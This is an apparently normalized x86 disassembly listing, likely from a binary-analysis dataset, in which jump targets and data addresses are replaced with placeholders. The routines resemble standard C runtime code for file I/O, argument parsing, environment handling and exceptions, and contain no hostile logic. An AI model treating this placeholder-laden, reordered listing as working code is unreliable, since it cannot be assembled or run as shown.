mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov esi [ edi + 0x10 ]
cmp [ edi + 0x4 ] ebx
mov [ ebp - 0xc ] esi
jge r-xdata
push 0x1
push ebx
push esi
call sub_4057ba
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
or eax 0xffffffff
jmp r-xdata
mov ecx [ edi + 0xc ]
test cx 0x108
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
mov edx [ edi + 0x8 ]
mov ebx eax
sub ebx edx
test cl 0x3
mov [ ebp - 0x8 ] ebx
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test cl 0x80
jne r-xdata
mov ebx esi
mov ecx esi
sar ebx 0x5
and ecx 0x1f
mov ebx [ ebx * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
test [ ebx + ecx * 4 + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_4057a8
mov [ eax ] 0x16
mov ecx edx
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
jne r-xdata
inc ecx
jmp r-xdata
inc [ ebp - 0x8 ]
sub eax edx
add eax ecx
mov [ ebp + 0x8 ] eax
mov eax esi
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax esi
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ esi + eax + 0x4 ] 0x80
je r-xdata
and [ ebp - 0x8 ] ecx
jmp r-xdata
cmp ecx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x4 ] eax
push 0x2
push 0x0
push [ ebp - 0xc ]
call sub_4057ba
add esp 0xc
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call sub_4057ba
mov eax 0x200
add esp 0xc
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
test [ edi + 0xd ] 0x20
jmp r-xdata
cmp [ eax ] 0xa
jne r-xdata
inc [ ebp + 0x8 ]
test ch 0x4
je r-xdata
je r-xdata
inc eax
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x4
cmp eax ecx
jae r-xdata
sub_405a15
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov al [ edi ]
cmp al 0x61
je r-xdata
mov ecx 0x109
cmp al 0x72
je r-xdata
push 0x1a4
push [ ebp + 0x10 ]
push ecx
push [ ebp + 0x8 ]
call sub_408206
mov ecx eax
add esp 0x10
cmp ecx ebx
jge r-xdata
cmp edx ebx
je r-xdata
xor ecx ecx
or esi 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
movsx eax al
cmp eax 0x54
jg r-xdata
push 0x1
pop edx
mov ecx 0x301
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax 0x62
je r-xdata
je r-xdata
or esi 0x2
test ch 0xc0
je r-xdata
dec eax
je r-xdata
mov eax 0x1000
test eax ecx
jne r-xdata
sub eax 0x2b
je r-xdata
or ch 0x80
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
or ecx eax
jmp r-xdata
test cl 0x2
jne r-xdata
sub eax 0x19
je r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
je r-xdata
mov [ ebp - 0x8 ] 0x1
or esi 0x4000
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
and ecx 0xfffffffe
and esi 0xfffffffc
or ecx 0x2
or esi 0x80
jmp r-xdata
test cl 0x40
jne r-xdata
sub eax 0xe
je r-xdata
mov [ ebp - 0x8 ] 0x1
and esi 0xffffbfff
jmp r-xdata
test ch 0xc0
jne r-xdata
or ecx 0x40
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
dec eax
jne r-xdata
or ch 0x40
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x20
jmp r-xdata
sub_405b85
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_403c8c
xor esi esi
cmp [ rw-data ] ebx
pop ecx
jle r-xdata
push 0x2
call sub_403ced
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
cmp eax ebx
je r-xdata
push 0x38
shl esi 0x2
call sub_406abc
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
mov eax [ esi + eax ]
cmp eax ebx
je r-xdata
test [ eax + 0xc ] 0x83
jne r-xdata
add eax 0x20
push eax
call [ InitializeCriticalSection@IAT ]
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
inc esi
cmp esi [ rw-data ]
jl r-xdata
push eax
push esi
call sub_404db5
pop ecx
pop ecx
mov ecx [ rw-data ]
mov eax [ ecx + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
or [ edi + 0x10 ] 0xffffffff
mov [ edi + 0x4 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
jmp r-xdata
mov edi [ ecx + esi * 4 ]
jmp r-xdata
push eax
push esi
call sub_404e07
pop ecx
pop ecx
cmp edi ebx
je r-xdata
sub_405c4d
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_4057a8
mov [ eax ] 0x9
call sub_4057b1
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_4080f2
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_405cb2
push esi
mov edi eax
call sub_408151
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_405cb2
push ebp
mov ebp esp
sub esp 0x414
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push [ ebp + 0x8 ]
call sub_40581f
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
call sub_4057a8
mov [ eax ] 0x1c
call sub_4057b1
mov [ eax ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_405735
pop ecx
call sub_4057a8
mov [ eax ] 0x9
call sub_4057b1
mov [ eax ] esi
jmp r-xdata
sub_405e8c
push edi
call sub_405f31
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_405f43
pop ecx
pop ecx
test ebx ebx
pop ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
call sub_405f3a
pop edi
retn
push rw-data
push rw-data
call sub_405f43
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_405f5d
push ebp
mov ebp esp
push ecx
push ebx
push esi
call sub_404c63
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_40609b
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x54 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop esi
pop ebx
leave
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov edx [ rw-data ]
mov ecx [ rw-data ]
add ecx edx
push edi
cmp edx ecx
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x58 ]
cmp eax 0xc000008e
jne r-xdata
lea ecx [ edx + edx * 2 ]
shl ecx 0x2
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x58 ] 0x83
jmp r-xdata
mov edi [ esi + 0x50 ]
add ecx 0xc
and [ ecx + edi - 0x4 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
cmp edx ebx
jl r-xdata
mov ebx [ ebp + 0x8 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x58 ] 0x81
jmp r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x58 ] edi
pop ecx
pop edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x58 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x54 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x58 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x58 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x58 ] 0x86
jmp r-xdata
mov [ esi + 0x58 ] 0x8a
sub_40609b
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax ] esi
je r-xdata
cmp [ eax ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_4060d5
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
mov al [ esi ]
cmp al 0x22
jne r-xdata
call sub_4040da
cmp al 0x20
jbe r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je r-xdata
mov al [ esi ]
test al al
je r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
cmp [ esi ] 0x22
jne r-xdata
test al al
je r-xdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe r-xdata
inc esi
jmp r-xdata
movzx eax al
push eax
call sub_4084d5
test eax eax
pop ecx
je r-xdata
inc esi
jmp r-xdata
sub_40612d
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_4040da
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_406abc
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_403c1a
pop ecx
push esi
call sub_407020
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_404e2a
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_406abc
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_407020
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_408520
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_403c1a
pop ecx
sub_4061e6
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_4040da
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_40627f
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_406abc
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_40627f
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_403c1a
pop ecx
sub_40627f
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_406433
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_406abc
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_406abc
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_405400
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_404e2a
pop ecx
mov [ esp + 0x10 ] ebx
sub_406565
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x480
call sub_406abc
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x480 ]
push 0x1b
call sub_403c1a
pop ecx
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
and [ esi + 0x8 ] 0x0
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x24
add eax 0x480
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ebx * 8 ]
cmp [ ecx + eax * 4 ] 0xffffffff
lea esi [ ecx + eax * 4 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] edi
jge r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov edi [ rw-data ]
add [ rw-data ] 0x20
mov [ esi ] eax
lea ecx [ eax + 0x480 ]
cmp eax 0x3
jne r-xdata
add [ ebp - 0x4 ] 0x4
inc esi
inc ebx
cmp esi edi
jl r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
add esi 0x4
cmp [ rw-data ] edi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ esi ]
add eax 0x24
add ecx 0x480
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test al 0x8
jne r-xdata
push 0x480
call sub_406abc
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov cl [ ebx ]
mov [ eax + 0x4 ] cl
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_406721
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_407353
test eax eax
jne r-xdata
push 0x1
pop eax
retn
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_406760
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4067a2
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_406780
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_406836
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_406850
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_4067a2
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_406760
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_4067a2
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_406836
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_406930
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_406969
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_406969
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_406969
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jl r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_407020
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
